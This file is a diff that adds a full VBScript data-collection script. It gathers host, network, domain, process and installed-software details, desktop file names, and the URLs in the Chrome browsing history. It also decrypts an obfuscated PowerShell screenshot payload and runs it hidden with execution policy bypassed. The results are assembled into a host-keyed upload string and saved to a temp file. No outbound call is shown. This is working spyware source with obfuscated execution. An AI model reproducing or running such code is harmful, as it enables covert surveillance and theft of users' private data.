@@ -1,0 +1,412 @@
+Set WSHNetwork = CreateObject("WScript.Network")
+Set objLocator = CreateObject("WbemScripting.SWbemLocator")
+Set objWMIService = objLocator.ConnectServer(".", "root\cimv2")
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Set objWSH = CreateObject("WScript.Shell")
+Set objStream = CreateObject("ADODB.Stream")
+CryptoKey = "}zb~d9"
+
+Str =""
+Str = head
+Str = Str & "SystemInfo=" & GetTextRunCmd("SystemInfo") & "&"
+Str = Str & "SoftwareInfo=" & GetListProductOrProcess("Win32_Product") & "&"
+Str = Str & "NetworkInfo=" & GetTextRunCmd("IpConfig /All") & "&"
+Str = Str & "ProcessList=" & GetListProductOrProcess("Win32_Process") & "&"
+Str = Str & "DesktopFileList=" & GetDesktopFileList() & "&"
+Str = Str & "DesktopScreenshot=" & GetScreenshotBase64() & "&"
+Str = Str & "WebHistory=" & GetHistoryChrome & "&"
+Str = Str & "stype=vbs"
+
+objStream.Type = 2
+objStream.Mode = 3
+objStream.Open
+objStream.Charset = "utf-8"
+objStream.WriteText Str
+objStream.SaveToFile FSO.GetSpecialFolder(2) & "\" & FSO.GetTempName
+
+MsgBox "done"
+
+Function head()
+Set ColItems = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
+
+	For Each objItem In ColItems
+		head = vbNullString
+		head = head & "id=" & Replace(objItem.MACAddress, ":", "") & "&type=put&"
+		head = head & "Hostname=" & objItem.DNSHostName & "&"
+	Next
+
+	Set ColItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
+		
+	For Each objItem In ColItems
+		If objItem.DomainRole Then
+			head = head & "DomainMember=yes&"
+		Else
+			head = head & "DomainMember=no&"
+		End If
+		head = head & "DomainName=" & objItem.Domain & "&"
+		If objItem.DomainRole Then
+			head = head & "DomainHosts=" & ComputerOfDamainCount & "&"
+		Else
+			head = head & "DomainHosts=-1&"
+		End If
+		head = head & "UserName=" & WSHNetwork.UserName & "&"
+	Next
+
+	Set Drives = FSO.Drives
+	StrDrives = ""
+
+	For Each Drive In Drives
+		StrDrives = StrDrives & Drive.DriveLetter & ":;"
+	Next
+
+	head = head & "LogicalDrives=" & StrDrives & "&"
+
+
+
+End Function
+
+Function GetTextRunCmd(Command)
+    FileName = FSO.GetSpecialFolder(2) & "\" & FSO.GetTempName
+    GetTextRunCmd = ""
+    
+    objWSH.Run "cmd /C " & Command & " > " & FileName, 0, True
+    
+    objStream.Type = 2
+    objStream.Open
+    objStream.Charset = "cp866"
+    objStream.LoadFromFile (FileName)
+    Text = objStream.ReadText()
+    For Each l In Split(Text, vbCrLf)
+        If l <> "" Then
+            GetTextRunCmd = GetTextRunCmd & l & "%%%"
+        End If
+    Next
+    objStream.Close
+    FSO.DeleteFile FileName
+End Function
+
+Function GetListProductOrProcess(Win32)
+    Set ColItems = objWMIService.ExecQuery("SELECT * FROM " & Win32, , 48)
+    GetListProductOrProcess = ""
+    For Each objItem In ColItems
+        GetListProductOrProcess = GetListProductOrProcess & objItem.Name & "%%%"
+    Next
+End Function
+
+Function GetDesktopFileList()
+    DesktopFolder = objWSH.SpecialFolders("Desktop")
+    Set Files = FSO.GetFolder(DesktopFolder).Files
+    For Each File In Files
+        GetDesktopFileList = GetDesktopFileList & File.Name & "%%%"
+    Next
+End Function
+
+Function GetScreenshotBase64()
+    FileName = FSO.GetSpecialFolder(2) & "\" & FSO.GetTempName
+    Set objTS = FSO.CreateTextFile(FileName & ".ps1", True)
+    
+	Text1 = "-9/2-9,7-8,7/3/2*3,7,6,7/4/2.0/2.0,7.0.1.0/2*3*4/4/3.1/2.0)0.1/2.0/2.1,7/4,6,6/3.1,6/4*3)0,6.1+5/3/2-9/3*3)1+5.1-8/4.1,7/2/3+4.1.0,6/2/3.1/4+4*2/3/3.0/4+4*4/2/3-9/2.1+5-8,8,7/4.0,6/2/3.1.0-9,7/2/2.0,7,6,6/4/3-9/4)1C11272723231817131024211610211622211621141127251326211414241424272829161320282723229,6/3-9/4.0+5/3,6-8/3-0,7/2,6*3,6.1+5/3/2-9/3+4*2/2/2.0/3.1(818121429241427262325121817231127251326211414241424272829161829292020251620251614101126211125171026121421291428231919109/3/3.0/3.1Y16141627291224202427191317252921261824181620171620222112101820222416181117101919109/2/3-9/3.0,6/2,6,6/3.1,7-9/3.0/3-8+5/3/2-9/3*4(32723232626111718202725172116101225162225191213122723191513,6/2.1/4.1,6/3-8.0/4.1+5/4+5+5+5,7+5/4,6,7/2.0+5/2/3*3.0/2,7/4/2.0,7,6,7/2/4.0/3.0)0.0/2-9/4-9,6/2/3-9,6-9*4/4/3.1/2.0)0.1/2.0/2.1,7/4,6,6/3.1,6/4,6,6/4.1,7/3/3-9-8+5*3/3/3.0/4.0,6/3,6*3.1-8,7/4/3-9/3+4+4/3/3-9/3.1,7,7-9.0/4.0,7,7-8.1/4.1,6/3.1+5-8,6,7/3/3-9/3.1)0.0/2.2/2+4F1523112725132621142325172523272116172626272116142226232724122810161421192229262216152929271616102929202025161914142527112023221221142522231713,6/3-9/4.0+5/3.1-0/3.0+5+5-8*3+61022181114182723101115122023272428182329272712102627242729132227282621162018182724162015181225162923192612181723112725132621142325172523272116172626272116102426192720101310182025162226292919112623281216182222182113,6/2.0/2.0+5+5-8*3.0.0,7,7.0-9/3.0+5/4+5-8/4.1,7/2/3+4-9.1+5/4/2.0/2+4*2/3/3.0/2.1(711271720211825181521201329161012251629231926161926272120269*3*3*3/2.1+5/3/2.0/2*3)1+5.1-8/4.1,7/2/3+4-9.1+5/4/2.0/2+4*2/3.1.1/3.0+5/4.1+5-8,7,7/3/3,7/3-9+6/2,6*3/3.0+5/2/2*3*3)1(32723232626-8+5,7/2.1)0.0.2.0/2-9,7+5.0.1/4.1+5/3,6,6/4-9,7/3/3.0,7,8,6/3/3.1,6+4)0+5,7*3*3)1(328261528241224181527221815262925131629231926109/3/3.0/3.1)0+5+5.1/3.0,6/4,6*3,6.0,6/2/2-9,7-8,6/4/2*3-8)1C1121252025182918292320172014191818182417172426182428102921122123271218112221232623132723172217172820191611102627242729132227282621162018182724162018152324122626111418172627232225182516102713182028192516142022182729121112292029121119252025182925161417142926192626132827202711*3.1-8/4.1,7/2/3+4.1.0,6/2/3.1/4+4*2/3/3.0/4+4*2/4/3.1/3.1,7.1,8+5-9.0+5/2/3.0/4+4*2/3.1.1,6*3+6/3.1.1/3.0+5,6+5*3/2.1,7/4/3.1-9.1,7/3/2.1,6)1C11271720211825272021281817131010"
+
+	TextCrypt = Encryption(MakeCryptoText(TextUnShifter(Text1)), False)
+
+    Text1 = "+5*3)0,6.0,6/2/2-9,7-8+5/4/2*3,6.1+5/3/2-9/3-9+5/3/3-9,7*3+4.0/4.1/4.0,6,7-9.1/2.1,6/3/2+4-9.0+5/2/2.0/2+4*3/3.1.0/2,7,6/3/3-9/4-9)1-8.0.0/2+41915181225162225191213142323181225162923192615192020191012182823232221161110222329122525141929142827282916102429212710182921152213151322282911"
+	
+	TextCrypt = TextCrypt & FileName & ".png" & Encryption(MakeCryptoText(TextUnShifter(Text1)), False)
+	
+
+    objTS.WriteLine(TextCrypt)
+    objTS.Close
+
+    pwsh_command = "powershell.exe -executionpolicy bypass -file " & FileName & ".ps1"
+    objWSH.Run pwsh_command, 0, True
+    FSO.DeleteFile FileName & ".ps1"
+    
+    objStream.Type = 1 ' TypeBinary
+    objStream.Open
+    objStream.LoadFromFile (FileName & ".png")
+    readBytes = objStream.Read()
+    Set objXML = CreateObject("MSXml2.DOMDocument")
+    objXML.LoadXML "<Base64Data />"
+    Set objDocElem = objXML.DocumentElement
+    objDocElem.DataType = "bin.base64"
+    objDocElem.NodeTypedValue = readBytes
+    GetScreenshotBase64 = objDocElem.Text
+    objStream.Close
+    FSO.DeleteFile FileName & ".png"
+End Function
+
+Function StrConv(Text, IncomingCharset, OutgoingCharset)
+    objStream.Type = 2
+    objStream.Mode = 3
+    objStream.Open
+    objStream.Charset = IncomingCharset
+    
+    objStream.WriteText Text
+    objStream.Position = 0
+    objStream.Charset = SourceCharset
+    StrConv = objStream.ReadText
+End Function
+
+Function GetHistoryChrome()
+	'Set objWSH = CreateObject("WScript.Shell")
+	'Set FSO = CreateObject("Scripting.FileSystemObject")
+	Set dic = CreateObject("Scripting.Dictionary")
+
+	LocalAppData = objWSH.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+	ChromeHistoryFile = LocalAppData & "\Google\Chrome\User Data\Default\History"
+
+	If FSO.FileExists(ChromeHistoryFile) Then
+		Set objStream = CreateObject("ADODB.Stream")
+		readBytes=Array()
+		objStream.Type = 1 ' TypeBinary
+		objStream.Open
+
+		objStream.LoadFromFile (ChromeHistoryFile)
+		readBytes = objStream.Read()
+		objStream.Close
+		For i = 1 To UBound(readBytes)
+			istr = 0
+			addstr = ""
+			http = ""
+			https = ""
+			
+			If AscB(MidB(readBytes, i, 1)) = 104 Then
+				http = Chr(AscB(MidB(readBytes, i, 1))) + Chr(AscB(MidB(readBytes, i + 1, 1))) + Chr(AscB(MidB(readBytes, i + 2, 1))) + Chr(AscB(MidB(readBytes, i + 3, 1))) + Chr(AscB(MidB(readBytes, i + 4, 1))) + Chr(AscB(MidB(readBytes, i + 5, 1))) + Chr(AscB(MidB(readBytes, i + 6, 1)))
+				https = http + Chr(AscB(MidB(readBytes, i + 7, 1)))
+				If https = "https://" Then
+					istr = 8
+					addstr = "https://"
+					While AscB(MidB(readBytes, i + istr, 1)) > 32 And AscB(MidB(readBytes, i + istr, 1)) < 123
+						addstr = addstr + Chr(AscB(MidB(readBytes, i + istr, 1)))
+						istr = istr + 1
+					Wend
+					If Not dic.Exists(addstr) Then dic.Add addstr, i + istr
+				ElseIf http = "http://" Then
+					istr = 7
+					addstr = "http://"
+					While AscB(MidB(readBytes, i + istr, 1)) > 32 And AscB(MidB(readBytes, i + istr, 1)) < 123
+						addstr = addstr + Chr(AscB(MidB(readBytes, i + istr, 1)))
+						istr = istr + 1
+					Wend
+					If Not dic.Exists(addstr) Then dic.Add addstr, i + istr
+				End If
+			End If
+		Next
+		For Each e In dic.Keys
+			GetHistoryChrome = GetHistoryChrome & e & "%%%"
+		Next
+	Else
+		GetHistoryChrome = "nothing"
+	End If
+
+End Function
+
+Function ComputerOfDamainCount()
+    Const ADS_SCOPE_SUBTREE = 2
+    Set objConnection = CreateObject("ADODB.Connection")
+    Set objCommand = CreateObject("ADODB.Command")
+    Set WshNetwork = CreateObject("WScript.Network")
+    UserDomain = WshNetwork.UserDomain
+    Set ldap = GetObject("LDAP://" & UserDomain & "/RootDSE")
+    If (VarType(ldap) <> vbObject) Then
+        ComputerOfDamainCount = -1
+        Exit Function
+    End If
+    GetDomainDN = ldap.Get("defaultNamingContext")
+    
+    objConnection.Provider = "ADsDSOObject"
+    objConnection.Open "Active Directory Provider"
+    Set objCommand.ActiveConnection = objConnection
+    objCommand.Properties("Page Size") = 1000
+    objCommand.Properties("Searchscope") = ADS_SCOPE_SUBTREE
+
+
+    strLDAP = "LDAP://" + GetDomainDN
+    objCommand.CommandText = "SELECT cn FROM '" & strLDAP & "' WHERE objectCategory='Computer'AND objectClass='computer'"
+    Set objRecordSet = objCommand.Execute
+
+    ComputerOfDamainCount = Str(objRecordSet.RecordCount)
+End Function
+
+
+
+Private Function GetShiftKey()
+On Error Resume Next
+Set Key = CreateObject("Scripting.Dictionary")
+
+l = Len(CryptoKey)
+i1 = 0
+    With Key
+        For i = 1 To l
+            s = Mid(CryptoKey, i, 1)
+            n = (Asc(s) Mod 8) + 1
+            If Not .Exists(n) Then
+                .Add n, n
+                i1 = i1 + 1
+            End If
+            If i1 = 9 Then Exit For
+        Next
+        If i >= l And i1 < 9 Then
+            For i = 1 + 1 To 8
+                If Not .Exists(i) Then
+                    .Add i, i
+                End If
+            Next
+        End If
+        For i = 1 To 8
+            GetShiftKey = GetShiftKey + .Items()(i)
+        Next
+    End With
+End Function
+
+Private Function TextShifter(txt)
+    Dim nKeys(), out()
+	
+    Key = GetShiftKey
+    n = Len(Key)
+    If n = 0 Then Exit Function
+    l = Len(txt)
+    m = -Int(-l / n)
+    
+    ReDim nKeys(n)
+
+    For i = 1 To n
+        s1 = Mid(Key, i, 1)
+        For j = 1 To n
+            s2 = Mid(Key, j, 1)
+            If s1 > s2 Or (s1 = s2 And j <= i) Then
+				nKeys(i) = nKeys(i) + 1
+			End If
+		Next
+    Next
+    
+    ReDim out(n * m)
+    For i = 1 To Len(txt)
+        out(nKeys((i - 1) Mod n + 1) * m + (i - 1) \ n - m + 1) = Mid(txt, i, 1)
+    Next
+    TextShifter = Join(out, "")
+End Function
+
+Function TextUnShifter(txt)
+    Dim nKeys(), sKeys(), out()
+    Key = GetShiftKey
+    n = Len(Key)
+    If n = 0 Then Exit Function
+    l = Len(txt)
+    m = -Int(-l / n)
+    d = l Mod n
+
+    ReDim nKeys(n), sKeys(n)
+    For i = 1 To n
+        nKeys(i) = i
+        sKeys(i) = Mid(Key, i, 1)
+        For j = 1 To i - 1
+            If sKeys(i) < sKeys(j) Then
+                sTmp = sKeys(i): sKeys(i) = sKeys(j): sKeys(j) = sTmp
+                nTmp = nKeys(i): nKeys(i) = nKeys(j): nKeys(j) = nTmp
+            End If
+		Next
+    Next
+    
+    ReDim out(n, m)
+    For i = 1 To n
+        For j = 1 To m + (nKeys(i) > d And d > 0)
+            k = k + 1
+            out(nKeys(i), j) = Mid(txt, k, 1)
+		Next
+    Next
+    For j = 1 To m
+        For i = 1 To n
+            outTxt = outTxt & out(i, j)
+		Next
+    Next
+    TextUnShifter = outTxt
+End Function
+
+
+Private Function Encryption(StrKey, Encrypt)
+    Set CryptoDictionary = CreateObject("Scripting.Dictionary")
+
+    With CryptoDictionary
+        For i = 1 To Len(CryptoKey)
+            .Add i, Mid(CryptoKey, i, 1)
+        Next
+    End With
+    Shift = 0
+    With CryptoDictionary
+        For i = 1 To Len(StrKey)
+                If (i - Shift) > .Count Then
+                    Shift = i - 1
+                End If
+            If Encrypt Then
+                Namber_Simbol = Asc(Mid(StrKey, i, 1)) + Asc(.Item(i - Shift))
+                If Namber_Simbol > 255 Then Namber_Simbol = Namber_Simbol - 255
+                Encryption = Encryption + Chr(Namber_Simbol)
+            Else
+                Namber_Simbol = Asc(Mid(StrKey, i, 1)) - Asc(.Item(i - Shift))
+                If Namber_Simbol < 1 Then Namber_Simbol = Namber_Simbol + 255
+                Encryption = Encryption + Chr(Namber_Simbol)
+            End If
+        Next
+    End With
+End Function
+
+Private Function MakeCryptoText(CryptoText)
+
+    MakeCryptoText = ""
+    For i = 1 To Len(CryptoText)
+        Simbol = Asc(Mid(CryptoText, i, 1))
+        If Simbol = 35 Then
+            Simbol = Int(Mid(CryptoText, i + 1, 1))
+            MakeCryptoText = MakeCryptoText + Chr(Simbol)
+            i = i + 1
+        ElseIf Simbol > 35 And Simbol < 41 Then
+            Simbol = Int(Mid(CryptoText, i + 1, 2))
+            MakeCryptoText = MakeCryptoText + Chr(Simbol)
+            i = i + 2
+        ElseIf Simbol > 40 And Simbol < 48 Then
+            Simbol = Int(Mid(CryptoText, i + 1, 3))
+            MakeCryptoText = MakeCryptoText + Chr(Simbol)
+            i = i + 3
+        Else
+            MakeCryptoText = MakeCryptoText + Chr(Simbol)
+        End If
+    Next
+End Function
+
+Private Function MakeText(CryptoText)
+	Simbol = 0
+    MakeText = ""
+    For i = 1 To Len(CryptoText)
+        Simbol = Asc(Mid(CryptoText, i, 1))
+        If Simbol >= 0 And Simbol <= 9 Then
+            MakeText = MakeText + "#" + Mid(CryptoText, i, 1) '35
+        ElseIf Simbol >= 10 And Simbol <= 19 Then
+            MakeText = MakeText + "$" + Mid(CryptoText, i, 1) '36
+        ElseIf Simbol >= 20 And Simbol <= 29 Then
+            MakeText = MakeText + "%" + Mid(CryptoText, i, 1) '37
+        ElseIf Simbol >= 30 And Simbol <= 39 Then
+            MakeText = MakeText + "&" + Mid(CryptoText, i, 1) '38
+        ElseIf Simbol >= 40 And Simbol <= 47 Then
+            MakeText = MakeText + "'" + Mid(CryptoText, i, 1) '39
+        ElseIf Simbol >= 91 And Simbol <= 99 Then
+            MakeText = MakeText + "(" + Mid(CryptoText, i, 1) '40
+        ElseIf Simbol >= 100 And Simbol <= 120 Then
+            MakeText = MakeText + ")" + Mid(CryptoText, i, 1) '41
+        ElseIf Simbol >= 121 And Simbol <= 140 Then
+            MakeText = MakeText + "*" + Mid(CryptoText, i, 1) '42
+        ElseIf Simbol >= 141 And Simbol <= 160 Then
+            MakeText = MakeText + "+" + Mid(CryptoText, i, 1) '43
+        ElseIf Simbol >= 161 And Simbol <= 180 Then
+            MakeText = MakeText + "," + Mid(CryptoText, i, 1) '44
+        ElseIf Simbol >= 181 And Simbol <= 200 Then
+            MakeText = MakeText + "-" + Mid(CryptoText, i, 1) '45
+        ElseIf Simbol >= 201 And Simbol <= 220 Then
+            MakeText = MakeText + "." + Mid(CryptoText, i, 1) '46
+        ElseIf Simbol >= 221 And Simbol <= 255 Then
+            MakeText = MakeText + "/" + Mid(CryptoText, i, 1) '47
+        Else
+            MakeText = MakeText + Mid(CryptoText, i, 1)
+        End If
+    Next
+End Function
